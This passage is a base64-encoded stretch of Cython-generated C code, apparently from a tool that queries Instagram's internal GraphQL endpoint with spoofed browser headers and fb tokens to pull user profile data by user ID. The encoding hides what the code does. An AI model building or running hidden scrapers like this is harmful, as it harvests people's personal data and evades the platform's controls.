eXhfbl91X2FjY2VwdCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMykgPCAoMCkpIF9fUFlYX0VSUigwLCA0MDksIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfYWNjZXB0X2xhbmd1YWdlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2VuX2VuX1VTX3FfMF85KSA8ICgwKSkgX19QWVhfRVJSKDAsIDQwOSwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9jb250ZW50X3R5cGUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfYXBwbGljYXRpb25feF93d3dfZm9ybV91cmxlbmNvZGVfMykgPCAoMCkpIF9fUFlYX0VSUigwLCA0MDksIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kbnQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMSkgPCAoMCkpIF9fUFlYX0VSUigwLCA0MDksIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcmlnaW4sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfaHR0cHNfd3d3X2luc3RhZ3JhbV9jb20pIDwgKDApKSBfX1BZWF9FUlIoMCwgNDA5LCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcHJpb3JpdHksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfdV8xX2kpIDwgKDApKSBfX1BZWF9FUlIoMCwgNDA5LCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVmZXJlciwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9odHRwc193d3dfaW5zdGFncmFtX2NvbV9jcmlzdGlhbikgPCAoMCkpIF9fUFlYX0VSUigwLCA0MDksIF9fcHl4X0w1X2Vycm9yKVxuXG4gICAgICAgICAgXG4gICAgICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV91c2VyX2FnZW50LCBfX3B5eF92X3VzZXJfYWdlbnQpIDwgKDApKSBfX1BZWF9FUlIoMCwgNDA5LCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3hfZmJfZnJpZW5kbHlfbmFtZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1BvbGFyaXNVc2VySG92ZXJDYXJkQ29udGVudFYyUXVlKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQwOSwgX19weXhfTDVfZXJyb3IpXG5cbiAgICAgICAgICBcbiAgICAgICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3hfZmJfbHNkLCBfX3B5eF92X2xzZCkgPCAoMCkpIF9fUFlYX0VSUigwLCA0MDksIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X3ZfaGVhZGVycywgKChQeU9iamVjdCopX19weXhfdF81KSk7XG4gICAgICAgICAgX19weXhfdF81ID0gMDtcblxuICAgICAgICAgIFxuICAgICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCg2KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNDIxLCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbHNkLCBfX3B5eF92X2xzZCkgPCAoMCkpIF9fUFlYX0VSUigwLCA0MjEsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9mYl9hcGlfY2FsbGVyX2NsYXNzLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfUmVsYXlNb2Rlcm4pIDwgKDApKSBfX1BZWF9FUlIoMCwgNDIxLCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZmJfYXBpX3JlcV9mcmllbmRseV9uYW1lLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfUG9sYXJpc1VzZXJIb3ZlckNhcmRDb250ZW50VjJRdWUpIDwgKDApKSBfX1BZWF9FUlIoMCwgNDIxLCBfX3B5eF9MNV9lcnJvcilcblxuICAgICAgICAgIFxuICAgICAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X1VuaWNvZGUoX19weXhfdl9JZCk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDQyNCwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgICAgX19weXhfdF84ID0gX19QeXhfUHlVbmljb2RlX0NvbmNhdChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3VzZXJJRCwgX19weXhfdF83KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgNDI0LCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0SW5QbGFjZShfX3B5eF90XzgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfdXNlcm5hbWVfY3Jpc3RpYW5vKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgNDI0LCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICAgICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdmFyaWFibGVzLCBfX3B5eF90XzcpIDwgKDApKSBfX1BZWF9FUlIoMCwgNDIxLCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2VydmVyX3RpbWVzdGFtcHMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90cnVlKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQyMSwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RvY19pZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV83NzE3MjY5NDg4MzM2MDAxKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQyMSwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfWERFQ1JFRl9TRVQoX19weXhfdl9kYXRhLCAoKFB5T2JqZWN0KilfX3B5eF90XzUpKTtcbiAgICAgICAgICBfX3B5eF90XzUgPSAwO1xuXG4gICAgICAgICAgXG4gICAgICAgICAgX19weXhfdF83ID0gTlVMTDtcbiAgICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlcXVlc3RzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgNDI5LCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3Bvc3QpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0MjksIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuXG4gICAgICAgICAgXG4gICAgICAgICAgX19weXhfdF85ID0gMTtcbiAgICAgICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNCkpKSB7XG4gICAgICAgICAgICBfX3B5eF90XzcgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzQpO1xuICAgICAgICAgICAgYXNzZXJ0KF9fcHl4X3RfNyk7XG4gICAgICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNCk7XG4gICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF83KTtcbiAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzQsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgICAgICBfX3B5eF90XzkgPSAwO1xuICAgICAgICAgIH1cbiAgICAgICAgICAjZW5kaWZcbiAgICAgICAgICB7XG4gICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMiArICgoQ1lUSE9OX1ZFQ1RPUkNBTEwpID8gMiA6IDApXSA9IHtfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfaHR0cHNfd3d3X2luc3RhZ3JhbV9jb21fYXBpX2dyYXB9O1xuICAgICAgICAgICAgX19weXhfdF84ID0gX19QeXhfTWFrZVZlY3RvcmNhbGxCdWlsZGVyS3dkcygyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgNDI5LCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpO1xuICAgICAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGVhZGVycywgX19weXhfdl9oZWFkZXJzLCBfX3B5eF90XzgsIF9fcHl4X2NhbGxhcmdzKzIsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgNDI5LCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RhdGEsIF9fcHl4X3ZfZGF0YSwgX19weXhfdF84LCBfX3B5eF9jYWxsYXJncysyLCAxKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQyOSwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIoX19weXhfdF80LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgyLV9fcHl4X3RfOSkgfCAoX19weXhfdF85Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCksIF9fcHl4X3RfOCk7XG4gICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNDI5LCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICAgIH1cbiAgICAgICAgICBfX1B5eF9YREVDUkVGX1NFVChfX3B5eF92X3Jlc3BvbnNlLCBfX3B5eF90XzUpO1xuICAgICAgICAgIF9fcHl4X3RfNSA9IDA7XG5cbiAgICAgICAgICBcbiAgICAgICAgICBfX3B5eF90XzEyID0gX19weXhfdl9yZXNwb25zZTtcbiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xMik7XG4gICAgICAgICAgX19weXhfdF85ID0gMDtcbiAgICAgICAgICB7XG4gICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMiwgTlVMTH07XG4gICAgICAgICAgICBfX3B5eF90XzExID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2pzb24sIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDEtX19weXhfdF85KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgNDMxLCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTtcbiAgICAgICAgICB9XG4gICAgICAgICAgX19weXhfdF8xMCA9IF9fcHl4X3RfMTE7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTApO1xuICAgICAgICAgIF9fcHl4X3RfMTIgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMikpIF9fUFlYX0VSUigwLCA0MzEsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEyKTtcbiAgICAgICAgICBfX3B5eF90XzkgPSAwO1xuICAgICAgICAgIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1szXSA9IHtfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZGF0YSwgX19weXhfdF8xMn07XG4gICAgICAgICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgzLV9fcHl4X3RfOSkgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDtcbiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA0MzEsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgfVxuICAgICAgICAgIF9fcHl4X3RfNyA9IF9fcHl4X3RfNjtcbiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF83KTtcbiAgICAgICAgICBfX3B5eF90XzExID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgNDMxLCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7XG4gICAgICAgICAgX19weXhfdF85ID0gMDtcbiAgICAgICAgICB7XG4gICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbM10gPSB7X19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXNlciwgX19weXhfdF8xMX07XG4gICAgICAgICAgICBfX3B5eF90XzggPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgzLV9fcHl4X3RfOSkgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDQzMSwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgICAgICAgICB9XG4gICAgICAgICAgX19weXhfdF80ID0gX19weXhfdF84O1xuICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzQpO1xuICAgICAgICAgIF9fcHl4X3RfOSA9IDA7XG4gICAgICAgICAge1xuICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3VzZXJuYW1lfTtcbiAgICAgICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDItX19weXhfdF85KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0MzEsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgfVxuICAgICAgICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X3ZfdXNlcm5hbWUsIF9fcHl4X3RfNSk7XG4gICAgICAgICAgX19weXhfdF81ID0gMDtcblxuICAgICAgICAgIFxuICAgICAgICAgIF9fcHl4X3RfNyA9IF9fcHl4X3ZfcmVzcG9uc2U7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgICAgX19weXhfdF85ID0gMDtcbiAgICAgICAgICB7XG4gICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF83LCBOVUxMfTtcbiAgICAgICAgICAgIF9fcHl4X3RfMTEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfanNvbiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF85LCAoMS1fX3B5eF90XzkpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgNDMyLCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTtcbiAgICAgICAgICB9XG4gICAgICAgICAgX19weXhfdF82ID0gX19weXhfdF8xMTtcbiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF82KTtcblxuICAgICAgICAgIFxuICAgICAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgNDMzLCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICAgICAgICBfX3B5eF90XzkgPSAwO1xuICAgICAgICAgIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1szXSA9IHtfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kYXRhLCBfX3B5eF90Xzd9O1xuICAgICAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dldCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF85LCAoMy1fX3B5eF90XzkpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0MzIsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgICAgfVxuICAgICAgICAgIF9fcHl4X3RfOCA9IF9fcHl4X3RfNDtcbiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF84KTtcbiAgICAgICAgICBfX3B5eF90XzExID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgNDMzLCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7XG4gICAgICAgICAgX19weXhfdF85ID0gMDtcbiAgICAgICAgICB7XG4gICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbM10gPSB7X19weXhfdF84LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXNlciwgX19weXhfdF8xMX07XG4gICAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgzLV9fcHl4X3RfOSkgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDQzMywgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgICB9XG5cbiAgICAgICAgICBcbiAgICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2luZm9pbnN0YSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDQzMiwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KChQeU9iamVjdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfdl91c2VybmFtZSwgX19weXhfdF81KSA8IDApKSkgX19QWVhfRVJSKDAsIDQzMiwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG5cbiAgICAgICAgICBcbiAgICAgICAgICBfX3B5eF90XzQgPSBOVUxMO1xuICAgICAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2luZm9pbnN0YSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VSUigwLCA0MzQsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTtcbiAgICAgICAgICBfX3B5eF90XzggPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMTEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCA0MzQsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgICAgICAgX19weXhfdF8xMSA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDQzNCwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgICAgIF9fcHl4X3RfOSA9IDE7XG4gICAgICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgICAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzgpKSkge1xuICAgICAgICAgICAgX19weXhfdF80ID0gU